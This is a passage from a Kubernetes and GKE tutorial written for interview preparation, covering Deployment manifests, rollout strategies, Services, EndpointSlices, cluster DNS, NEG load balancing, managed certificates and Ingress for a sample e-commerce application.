        app.kubernetes.io/component: backend
        app.kubernetes.io/part-of: shopwave
        compliance: pci
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
    spec:
      serviceAccountName: payments
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 45
      priorityClassName: shopwave-critical
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        runAsGroup: 65532
        fsGroup: 65532
        seccompProfile:
          type: RuntimeDefault
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: DoNotSchedule
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: payments
      affinity:
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  app.kubernetes.io/name: payments
              topologyKey: kubernetes.io/hostname
      containers:
        - name: payments
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/payments:1.0.0
          ports:
            - name: http
              containerPort: 8080
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: STRIPE_KEY_FILE
              value: /etc/secrets/stripe-api-key
            - name: DRAIN_SECONDS
              value: "15"
          envFrom:
            - configMapRef:
                name: payments-config

          # Guaranteed QoS: requests == limits for BOTH cpu and memory.
          # Evicted last; gets oom_score_adj -997; eligible for exclusive
          # CPU pinning under the static CPU manager policy.
          resources:
            requests:
              cpu: 150m
              memory: 192Mi
            limits:
              cpu: 150m
              memory: 192Mi

          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 20
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              httpGet:
                path: /readyz
                port: http
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
            - name: stripe-secret
              mountPath: /etc/secrets
              readOnly: true
      volumes:
        - name: tmp
          emptyDir:
            medium: Memory
            sizeLimit: 32Mi
        - name: stripe-secret
          csi:
            driver: secrets-store.csi.k8s.io
            readOnly: true
            volumeAttributes:
              secretProviderClass: shopwave-stripe
```

> **`payments` uses an `httpGet` preStop, not `exec`.** It's a **distroless** image — there is no `/bin/sh`. An `exec` preStop would fail silently and you'd lose the drain delay entirely, with no error anywhere. This is exactly the kind of interaction between two "unrelated" decisions that real production is made of.

## 8.7 `inventory`

`08-workloads/05-inventory.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: inventory
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: inventory
    app.kubernetes.io/instance: inventory-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
  annotations:
    kubernetes.io/change-cause: "Initial deployment of inventory 1.0.0"
spec:
  replicas: 1
  revisionHistoryLimit: 10
  minReadySeconds: 10
  selector:
    matchLabels:
      app.kubernetes.io/name: inventory
      app.kubernetes.io/instance: inventory-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: inventory
        app.kubernetes.io/instance: inventory-prod
        app.kubernetes.io/version: "1.0.0"
        app.kubernetes.io/component: backend
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
    spec:
      serviceAccountName: inventory
      # inventory DOES call the API server for leader election.
      automountServiceAccountToken: true
      enableServiceLinks: false
      terminationGracePeriodSeconds: 30
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: ScheduleAnyway
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: inventory
      containers:
        - name: inventory
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/inventory:1.0.0
          ports:
            - name: http
              containerPort: 8080
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: POD_NAMESPACE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.namespace
          envFrom:
            - configMapRef:
                name: inventory-config
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
            limits:
              cpu: 400m
              memory: 256Mi
          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 20
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["/bin/sh", "-c", "sleep 5"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 64Mi
```

## 8.8 `notifications` — on Spot

`08-workloads/06-notifications.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: notifications
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: notifications
    app.kubernetes.io/instance: notifications-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: worker
    app.kubernetes.io/part-of: shopwave
  annotations:
    kubernetes.io/change-cause: "Initial deployment of notifications 1.0.0"
spec:
  replicas: 1
  revisionHistoryLimit: 10
  minReadySeconds: 10
  selector:
    matchLabels:
      app.kubernetes.io/name: notifications
      app.kubernetes.io/instance: notifications-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 1
  template:
    metadata:
      labels:
        app.kubernetes.io/name: notifications
        app.kubernetes.io/instance: notifications-prod
        app.kubernetes.io/version: "1.0.0"
        app.kubernetes.io/component: worker
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
    spec:
      serviceAccountName: notifications
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 25
      priorityClassName: shopwave-low
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: notifications
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/notifications:1.0.0
          ports:
            - name: http
              containerPort: 8080
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
          envFrom:
            - configMapRef:
                name: notifications-config
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
            limits:
              cpu: 300m
              memory: 256Mi
          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 20
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["/bin/sh", "-c", "sleep 5"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 64Mi
```

> **Spot nodes give ~30 seconds' notice.** GKE sends `SIGTERM` to pods on preemption, and `terminationGracePeriodSeconds` on a Spot node is **capped at 25s** — set it higher and GCP kills the VM anyway. That's why `notifications` is 25, not 60, and why anything with a longer drain requirement must not run on Spot. Nice, specific, real.

## 8.9 Rollouts in practice

```bash
kubectl apply -f 08-workloads/
kubectl get deploy -n shopwave-prod
kubectl rollout status deploy/catalog -n shopwave-prod --timeout=5m

# A real rollout
kubectl set image deploy/catalog -n shopwave-prod \
  catalog=asia-south1-docker.pkg.dev/kubernetas-console/shopwave/catalog:1.1.0

kubectl annotate deploy/catalog -n shopwave-prod \
  kubernetes.io/change-cause="Upgrade catalog to 1.1.0 - add search index" --overwrite

kubectl rollout status deploy/catalog -n shopwave-prod
kubectl rollout history deploy/catalog -n shopwave-prod

# Watch the two ReplicaSets trade places - this is the whole mechanism
kubectl get rs -n shopwave-prod -l app.kubernetes.io/name=catalog -w
```

Pause and resume — the manual canary:

```bash
kubectl rollout pause deploy/catalog -n shopwave-prod
# ... make several changes, none of which trigger a rollout ...
kubectl set image deploy/catalog -n shopwave-prod catalog=...:1.1.0
kubectl set resources deploy/catalog -n shopwave-prod -c catalog --limits=cpu=800m
kubectl rollout resume deploy/catalog -n shopwave-prod   # ONE rollout, not two
```

> **`rollout pause` is genuinely useful and under-taught.** Without it, `set image` then `set resources` = **two** rollouts back to back, double the churn. Pausing batches them into one. It's also the poor-man's canary: pause after the first new pod is up, watch metrics, resume or undo.

Rollback:

```bash
kubectl rollout undo deploy/catalog -n shopwave-prod
kubectl rollout undo deploy/catalog -n shopwave-prod --to-revision=3
```

Restart without changing anything:

```bash
kubectl rollout restart deploy/catalog -n shopwave-prod
```

> **How does `rollout restart` work with no spec change?** It **patches the pod template with an annotation**, `kubectl.kubernetes.io/restartedAt: <timestamp>`. Changing the template changes its hash, which creates a **new ReplicaSet**, which triggers a normal rolling update. There is no special "restart" API. Knowing that it's just a template mutation is a nice small proof you understand the controller model — and it's the correct way to pick up a changed Secret or ConfigMap (Part 11).

## 8.10 Deployment strategies — what Kubernetes gives you and what it doesn't

| Strategy | Native? | How |
|---|---|---|
| **RollingUpdate** | Yes | Default. `maxSurge`/`maxUnavailable`. |
| **Recreate** | Yes | Kill all, then start all. **Downtime.** Only for apps that cannot run two versions at once (e.g. a schema migration that isn't backward compatible, or a `ReadWriteOnce` volume). |
| **Blue/Green** | **No** | Two Deployments (`-blue`, `-green`); flip the **Service selector**. Instant cutover, instant rollback, 2× cost. |
| **Canary** | **Partially** | Crude: two Deployments behind one Service, ratio = replica counts (9 stable + 1 canary = 10%). Proper: Gateway API weighted routing, or Argo Rollouts / Flagger with automated metric analysis. |
| **A/B** | **No** | Header/cookie-based routing — needs Gateway API or a mesh. |

**Blue/green with plain manifests:**

```yaml
# Service selector points at ONE colour
apiVersion: v1
kind: Service
metadata:
  name: catalog
  namespace: shopwave-prod
spec:
  selector:
    app.kubernetes.io/name: catalog
    colour: blue          # <-- flip to green to cut over
  ports:
    - name: http
      port: 8080
      targetPort: http
```

```bash
kubectl patch svc catalog -n shopwave-prod \
  -p '{"spec":{"selector":{"colour":"green"}}}'
```

> **The honest answer to "how do you do canary in Kubernetes?"** — *"Kubernetes has no canary primitive. Replica-ratio canary is a hack: it doesn't control which users get the canary, it can't shift traffic in fine increments without a lot of replicas, and it has no automated analysis or rollback. For real canary you need traffic-weight control — Gateway API `HTTPRoute` backendRefs with weights, or Argo Rollouts driving it with a metric-based analysis gate."* Saying that Kubernetes **doesn't** have the feature is a stronger answer than pretending it does.

## 8.11 Part 8 interview talking points

- Deployment → ReplicaSet → Pod, three controllers, each with one job
- Rollback = scaling an old RS back up; `revisionHistoryLimit: 0` breaks it; a rollback can fail on a GC'd image
- `maxSurge`/`maxUnavailable`, and why `maxUnavailable: 0` hangs without headroom
- `minReadySeconds` as the cheapest canary
- `progressDeadlineSeconds` sets a **condition** — **Kubernetes never auto-rolls-back**
- The immutable selector, and why version doesn't belong in it
- `enableServiceLinks: false`
- `rollout restart` = a timestamp annotation on the template
- `rollout pause` to batch changes into one rollout
- Guaranteed QoS on `payments` and what it actually buys
- `httpGet` preStop for distroless
- Spot's 25s grace cap
- Kubernetes has no native canary/blue-green — what you actually use


---

# Part 9 — Services, DNS, EndpointSlices

## 9.1 What a Service actually is

A Service is **not a proxy**. There is no process listening on a ClusterIP. A ClusterIP is a **virtual IP that exists only as a rule in the dataplane** — an iptables rule with classic kube-proxy, or an eBPF map entry with Dataplane V2.

The chain:

```
You create a Service with a selector
        ↓
EndpointSlice controller watches Pods matching the selector
        ↓
It writes EndpointSlice objects listing the READY pod IPs
        ↓
kube-proxy / Cilium on EVERY node watches EndpointSlices
        ↓
Each node programs its own dataplane: ClusterIP -> DNAT -> one pod IP
        ↓
A packet from a pod to the ClusterIP is rewritten IN THE KERNEL
        on the sending node. It never touches a central component.
```

> **"Where does load balancing happen for a ClusterIP?"** → **On the client's node, in the kernel, before the packet leaves.** There is no central load balancer. Every node independently holds the full endpoint list and picks a backend. That's why Services scale — the dataplane is fully distributed — and why endpoint propagation is **eventually consistent** across nodes, which is the root of the termination race in Part 7.

## 9.2 The Service manifests

`09-services/00-frontend.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: frontend
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: frontend
    app.kubernetes.io/part-of: shopwave
  annotations:
    cloud.google.com/neg: '{"ingress": true}'
    cloud.google.com/backend-config: '{"default": "frontend-backendconfig"}'
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: frontend
    app.kubernetes.io/instance: frontend-prod
  ports:
    - name: http
      port: 80
      targetPort: http
      protocol: TCP
```

`09-services/01-catalog.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: catalog
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: catalog
    app.kubernetes.io/part-of: shopwave
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: catalog
    app.kubernetes.io/instance: catalog-prod
  ports:
    - name: http
      port: 8080
      targetPort: http
      protocol: TCP
```

`09-services/02-cart.yaml`, `03-orders.yaml`, `04-payments.yaml`, `05-inventory.yaml`, `06-notifications.yaml` — identical shape, changing only the name and selector:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: cart
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: cart
    app.kubernetes.io/part-of: shopwave
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: cart
    app.kubernetes.io/instance: cart-prod
  ports:
    - name: http
      port: 8080
      targetPort: http
---
apiVersion: v1
kind: Service
metadata:
  name: orders
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: orders
    app.kubernetes.io/part-of: shopwave
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: orders
    app.kubernetes.io/instance: orders-prod
  ports:
    - name: http
      port: 8080
      targetPort: http
---
apiVersion: v1
kind: Service
metadata:
  name: payments
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: payments
    app.kubernetes.io/part-of: shopwave
    compliance: pci
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: payments
    app.kubernetes.io/instance: payments-prod
  ports:
    - name: http
      port: 8080
      targetPort: http
---
apiVersion: v1
kind: Service
metadata:
  name: inventory
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: inventory
    app.kubernetes.io/part-of: shopwave
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: inventory
    app.kubernetes.io/instance: inventory-prod
  ports:
    - name: http
      port: 8080
      targetPort: http
---
apiVersion: v1
kind: Service
metadata:
  name: notifications
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: notifications
    app.kubernetes.io/part-of: shopwave
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: notifications
    app.kubernetes.io/instance: notifications-prod
  ports:
    - name: http
      port: 8080
      targetPort: http
```

> **`targetPort: http` — a named port, not a number.** The Service resolves the name against the pod's `ports[].name`. This means you can change the container's port from 8080 to 9090 in the Deployment and **the Service needs no edit**. Numeric `targetPort` couples the Service to the container's internals. Named ports are the enterprise habit, and it's a small thing that shows care.

> **`port` vs `targetPort` vs `nodePort` — say it cleanly:**
> - `port` — the port the **Service** listens on (the ClusterIP's port)
> - `targetPort` — the port on the **pod**
> - `nodePort` — the port opened on **every node** (NodePort/LoadBalancer only)

## 9.3 Service types

| Type | What it does | GCP realisation |
|---|---|---|
| **ClusterIP** | Virtual IP, cluster-internal only | Nothing external |
| **NodePort** | ClusterIP **plus** a port (30000–32767) on **every** node | Nothing; you'd need your own LB |
| **LoadBalancer** | NodePort **plus** a cloud LB | GCP **Network LB** (L4), a billed forwarding rule + public IP |
| **ExternalName** | A CNAME in CoreDNS. **No proxying, no endpoints.** | Nothing |
| **Headless** (`clusterIP: None`) | **No VIP.** DNS returns **all pod IPs** directly. | Nothing |

> **The layering is cumulative and it's a favourite question:** LoadBalancer **is** a NodePort **is** a ClusterIP. Creating a LoadBalancer Service allocates a ClusterIP *and* a nodePort *and* a cloud LB. This is why `services.nodeports: "0"` in our quota (Part 3) does **not** block LoadBalancer Services — the quota counts *type* NodePort, not the implicit nodePort underneath. Worth knowing.

**Headless — for StatefulSets:**

```yaml
apiVersion: v1
kind: Service
metadata:
  name: postgres-headless
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: postgres
spec:
  clusterIP: None
  selector:
    app.kubernetes.io/name: postgres
  ports:
    - name: postgres
      port: 5432
      targetPort: postgres
  publishNotReadyAddresses: true
```

> **`publishNotReadyAddresses: true` on a StatefulSet's headless Service is essential and subtle.** A clustered database (or Elasticsearch) needs its peers' DNS to resolve **during bootstrap**, before any of them are Ready — that's how they find each other to *become* Ready. Without this flag you get a **deadlock**: nobody is Ready, so no DNS records exist, so nobody can find peers, so nobody becomes Ready. A superb gotcha.

**ExternalName — no endpoints at all:**

```yaml
apiVersion: v1
kind: Service
metadata:
  name: stripe-api
  namespace: shopwave-prod
spec:
  type: ExternalName
  externalName: api.stripe.com
```

> **ExternalName is a CNAME and nothing more.** No proxying. So: **no TLS SNI rewriting** (the client still needs to present the real hostname), **NetworkPolicy cannot select it** (there are no pod IPs), and it silently doesn't work for anything that validates the certificate against the name it dialled. It's useful for migration indirection, and it surprises people constantly.

## 9.4 EndpointSlices

```bash
kubectl get endpointslices -n shopwave-prod
kubectl get endpointslice -n shopwave-prod -l kubernetes.io/service-name=catalog -o yaml
```

> **Why EndpointSlices replaced Endpoints (GA 1.21).** The old `Endpoints` object held **every** address for a Service in **one object**. A Service with 5,000 pods = one ~1 MB object. Every single pod change rewrote the **whole thing** and pushed **the whole thing** to every node watching it. With 5,000 endpoints churning, that's megabytes per second of control-plane traffic, and it was a documented hard scaling limit around ~1,000 endpoints per Service.
>
> EndpointSlices shard it: **100 endpoints per slice** by default. A pod change rewrites **one slice**, and only that slice is pushed. It also carries **topology hints** and per-endpoint **conditions** (`ready`, `serving`, `terminating`), which the old object could not.

**`serving` vs `terminating` — the modern nuance.** A terminating pod is `ready: false, serving: true, terminating: true`. That distinction is what makes **`spec.trafficDistribution`** and graceful-termination-aware proxies possible: existing connections can keep being served by a draining pod while new ones go elsewhere. It's also exactly the state your `preStop` sleep is buying time for.

## 9.5 DNS

CoreDNS runs as a Deployment in `kube-system`. Its ClusterIP is `10.48.0.10` (`.10` of our services range).

**The FQDN structure:**

```
catalog.shopwave-prod.svc.cluster.local
  |          |          |       |
service   namespace    type   cluster domain
```

**`/etc/resolv.conf` inside a pod:**

```
nameserver 10.48.0.10
search shopwave-prod.svc.cluster.local svc.cluster.local cluster.local
options ndots:5
```

> **`ndots:5` is the most consequential four characters in Kubernetes DNS.**
>
> It means: *"if the name has fewer than 5 dots, try the search domains first."*
>
> So a pod resolving `api.stripe.com` (2 dots) issues:
> 1. `api.stripe.com.shopwave-prod.svc.cluster.local` → NXDOMAIN
> 2. `api.stripe.com.svc.cluster.local` → NXDOMAIN
> 3. `api.stripe.com.cluster.local` → NXDOMAIN
> 4. `api.stripe.com` → **finally succeeds**
>
> And because glibc queries **A and AAAA in parallel**, that's **8 DNS queries** to resolve one external hostname. At scale this is a famous, real problem: CoreDNS CPU saturation, `i/o timeout` errors, mystery latency spikes on external API calls.
>
> **The fixes, in order of preference:**
> 1. **Use a trailing dot**: `api.stripe.com.` — fully qualified, skips the search list entirely. One query.
> 2. **Lower `ndots`** per pod:
> ```yaml
> dnsConfig:
>   options:
>     - name: ndots
>       value: "2"
> ```
> 3. **NodeLocal DNSCache** — a DaemonSet caching resolver on every node; the pod queries `169.254.20.10` locally. On GKE: `--addons=NodeLocalDNS`. Cuts CoreDNS load enormously and removes the conntrack race below.
> 4. Use **NodeLocal DNS + a longer cache TTL**, and fix `ndots` too.
>
> **This is one of the best DNS answers you can give in a Kubernetes interview**, because it's specific, it's real, and it explains a symptom (intermittent slow external calls) from first principles.

**The other famous DNS bug:** the **conntrack race** — parallel A/AAAA queries from the same source port to the same destination could hit a kernel race in `nf_conntrack` and one response would be dropped, giving a **5-second** DNS timeout (the glibc retry interval). Symptom: latency spikes of *exactly 5.000 seconds*, seemingly at random. Fixes: `single-request-reopen` in `dnsConfig`, NodeLocal DNSCache (which uses TCP upstream), or Dataplane V2 (eBPF bypasses the conntrack path).

**`dnsPolicy`:**

| Value | Meaning |
|---|---|
| `ClusterFirst` | **Default.** CoreDNS first, forwards external names upstream. |
| `ClusterFirstWithHostNet` | What you need with `hostNetwork: true` — otherwise you get the **node's** resolver and **cluster DNS silently doesn't work**. |
| `Default` | Inherit the **node's** resolv.conf. Confusingly named — it is *not* the default. |
| `None` | Use `dnsConfig` only. |

> **`dnsPolicy: Default` does not mean "the default".** It means "use the node's DNS". The actual default is `ClusterFirst`. This naming trips up everyone, and it's a nice quick question to get right.

**Verify:**

```bash
kubectl run dns-test -n shopwave-prod --rm -it --image=busybox:1.36 --restart=Never -- sh
# inside:
nslookup catalog
nslookup catalog.shopwave-prod.svc.cluster.local
nslookup postgres-0.postgres-headless.shopwave-prod.svc.cluster.local
cat /etc/resolv.conf
```

**StatefulSet pod DNS** — the reason StatefulSets exist:

```
postgres-0.postgres-headless.shopwave-prod.svc.cluster.local
```

**Stable, predictable, per-pod DNS.** A Deployment's pod is `catalog-7d9f8b-x4k2p` — random, and gone forever on reschedule. `postgres-0` is `postgres-0` after every restart, on any node, forever.

## 9.6 Container-native load balancing (NEGs)

```yaml
annotations:
  cloud.google.com/neg: '{"ingress": true}'
```

**Default (no NEG):** GCLB → nodePort on a node → **kube-proxy** → possibly a **different node** → pod. Two hops, source IP is SNATed at the second hop, health checks probe the *node*, and the LB has no idea which pods are actually healthy.

**With NEG:** GKE registers **pod IPs directly** as LB backends in a Network Endpoint Group. GCLB → **pod**, one hop. Consequences:

- **Real client IP preserved** (no second-hop SNAT)
- **Lower latency** (one fewer hop)
- **Accurate health checks** — the LB probes the pod, not the node
- **Correct load balancing** — GCLB balances across pods, not across nodes-then-randomly-across-pods (which double-balances and skews badly when pods are unevenly spread)
- The LB **honours pod readiness** via the readiness gate

> **The NEG readiness gate — this is the good part.** With NEGs, GKE injects a **readiness gate** into your pods: `cloud.google.com/load-balancer-neg-ready`. The pod is not marked Ready until the **load balancer has actually programmed it as a backend**. That closes the *other* half of the termination race: without it, a new pod goes Ready and the Deployment kills an old pod, but the LB hasn't finished programming the new one yet — so there's a window with **fewer live backends than you think**, and you drop traffic on scale-up too. NEG readiness gates fix that. It's an excellent, specific thing to know about GKE.

**BackendConfig — GCP-specific, exposes LB features:**

`10-ingress/00-backendconfig.yaml`:

```yaml
apiVersion: cloud.google.com/v1
kind: BackendConfig
metadata:
  name: frontend-backendconfig
  namespace: shopwave-prod
spec:
  timeoutSec: 30
  connectionDraining:
    drainingTimeoutSec: 60
  healthCheck:
    checkIntervalSec: 10
    timeoutSec: 5
    healthyThreshold: 1
    unhealthyThreshold: 3
    type: HTTP
    requestPath: /readyz
    port: 8080
  logging:
    enable: true
    sampleRate: 1.0
  securityPolicy:
    name: shopwave-armor-policy
  sessionAffinity:
    affinityType: "CLIENT_IP"
  cdn:
    enabled: false
```

> **`connectionDraining.drainingTimeoutSec: 60`** tells the **GCLB** to keep existing connections alive for 60s after a backend is removed. Note this is the LB's drain, entirely separate from `terminationGracePeriodSeconds` (the kubelet's) and from your `preStop` sleep. **Three independent timers, and they must be consistent** or you drop connections at whichever one is shortest. Being able to name all three and their relationship is a Staff-level answer.

## 9.7 Topology-aware routing

```yaml
metadata:
  annotations:
    service.kubernetes.io/topology-mode: Auto
```

or, modern (1.31+):

```yaml
spec:
  trafficDistribution: PreferClose
```

Keeps traffic **within the same zone** when possible. Cross-zone traffic in GCP is **billed** and adds ~1ms. On a chatty microservice mesh, that's real money and real latency.

> **The trap:** it only engages when there are **enough endpoints per zone** (the heuristic needs roughly ≥3 endpoints per zone, proportional to zone CPU). Below that, the hints controller **disables itself** and silently falls back to cluster-wide routing — because keeping traffic local with 1 endpoint in a zone would overload it. So it "doesn't work" on small deployments and there's no error telling you why. Also: it can create **hot spots** if your pods are unevenly distributed, which is why you pair it with `topologySpreadConstraints`.

## 9.8 Part 9 interview talking points

- A Service is not a proxy; ClusterIP is a dataplane rule; load balancing happens on the **client's node in the kernel**
- Service → EndpointSlice → kube-proxy/Cilium → per-node rules; eventual consistency is the root of the termination race
- Why EndpointSlices replaced Endpoints — the one-big-object scaling wall
- `serving` vs `ready` vs `terminating` conditions
- `port` / `targetPort` / `nodePort`; named ports decouple Service from container
- LoadBalancer ⊃ NodePort ⊃ ClusterIP
- Headless Services, and `publishNotReadyAddresses` solving the bootstrap deadlock
- ExternalName is a CNAME — no proxy, no NetworkPolicy, TLS surprises
- **`ndots:5`**: 8 queries to resolve `api.stripe.com`; trailing dot / lower ndots / NodeLocal DNSCache
- The 5-second conntrack DNS race
- `dnsPolicy: Default` is not the default; `ClusterFirstWithHostNet`
- NEGs: one hop, real client IP, accurate health checks, **and the readiness gate**
- BackendConfig; the **three** independent drain timers (LB, kubelet, preStop)
- Topology-aware routing and why it silently disables itself


---

# Part 10 — Ingress, Gateway API, TLS

## 10.1 Static IP and DNS

```bash
gcloud compute addresses create shopwave-ingress-ip --global
gcloud compute addresses describe shopwave-ingress-ip --global --format="value(address)"
```

> **Reserve a static IP, always.** An ephemeral Ingress IP is released when the Ingress is deleted and **you will not get it back**. Your DNS A record then points at someone else's load balancer. Reserving it also lets you create the DNS record *before* the Ingress exists, so certificate provisioning (which needs DNS to resolve) doesn't wait on you.

Point `shop.example.com` at that address in your DNS provider **before** applying the Ingress. Google-managed certificates will not provision until DNS resolves to the LB.

## 10.2 Managed certificate

`10-ingress/01-managedcertificate.yaml`:

```yaml
apiVersion: networking.gke.io/v1
kind: ManagedCertificate
metadata:
  name: shopwave-cert
  namespace: shopwave-prod
spec:
  domains:
    - shop.example.com
    - www.shop.example.com
```

> **Google-managed certificates: the constraints that catch people.**
> - Provisioning takes **15–60 minutes**, and it will sit in `Provisioning` looking broken the whole time.
> - It requires the **DNS A record to already resolve to the LB IP** — Google validates by HTTP.
> - **Maximum 100 domains** per certificate.
> - **No wildcards** with the HTTP-validated flavour.
> - Status `FailedNotVisible` means exactly one thing: **DNS isn't pointing here yet**. It is not a certificate problem.
>
> ```bash
> kubectl describe managedcertificate shopwave-cert -n shopwave-prod
> ```
> If you need wildcards, private CAs, or non-GCP DNS validation, use **cert-manager** with a DNS-01 solver instead.

## 10.3 FrontendConfig — HTTPS redirect and TLS policy

`10-ingress/02-frontendconfig.yaml`:

```yaml
apiVersion: networking.gke.io/v1beta1
kind: FrontendConfig
metadata:
  name: shopwave-frontendconfig
  namespace: shopwave-prod
spec:
  redirectToHttps:
    enabled: true
    responseCodeName: MOVED_PERMANENTLY_DEFAULT
  sslPolicy: shopwave-ssl-policy
```

```bash
gcloud compute ssl-policies create shopwave-ssl-policy \
  --profile=MODERN \
  --min-tls-version=1.2
```

> The HTTP→HTTPS redirect happens **at the load balancer**, not in your app. Your pods never see plaintext, you don't ship redirect middleware, and there's no way for a misconfigured app to serve HTTP by accident. Doing it at the edge is the correct layer.

## 10.4 The Ingress

`10-ingress/03-ingress.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: shopwave
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: shopwave
    app.kubernetes.io/part-of: shopwave
  annotations:
    kubernetes.io/ingress.class: "gce"
    kubernetes.io/ingress.global-static-ip-name: "shopwave-ingress-ip"
    networking.gke.io/managed-certificates: "shopwave-cert"
    networking.gke.io/v1beta1.FrontendConfig: "shopwave-frontendconfig"
spec:
  rules:
    - host: shop.example.com
      http:
        paths:
          - path: /api/products
            pathType: Prefix
            backend:
              service:
                name: catalog
                port:
                  name: http
          - path: /api/cart
            pathType: Prefix
            backend:
              service:
                name: cart
                port:
                  name: http
          - path: /api/orders
            pathType: Prefix
            backend:
              service:
                name: orders
                port:
                  name: http
          - path: /
            pathType: Prefix
            backend:
              service:
                name: frontend
                port:
                  name: http
    - host: www.shop.example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: frontend
                port:
                  name: http
```

### `pathType` — the field people get wrong

| Value | Semantics |
|---|---|
| `Exact` | Exact string match. `/api` matches `/api` only, **not** `/api/`. |
| `Prefix` | Matches on **path segments**, split by `/`. `/api` matches `/api` and `/api/foo`, but **NOT `/apifoo`**. |
| `ImplementationSpecific` | Whatever the controller wants. On GCE it's roughly a prefix; on nginx it's a **regex**. |

> **`Prefix` is segment-based, not string-based.** `/api` does not match `/apifoo`. People assume string prefix and are confused. And `ImplementationSpecific` is portability poison — it means your Ingress behaves differently on GKE than on nginx than on ALB. **Always specify `Exact` or `Prefix`.**

### Ingress's real limitations — say these out loud

Ingress is an **HTTP/HTTPS-only, L7-only** API with **no** standard support for:

- traffic **weighting** (canary)
- **header/cookie**-based routing
- **timeouts**, retries, mirroring
- **TCP/UDP/gRPC** (gRPC works, but only because it's HTTP/2)
- **cross-namespace** backends
- any **role separation** between the platform team who owns the LB and the app team who owns the routes

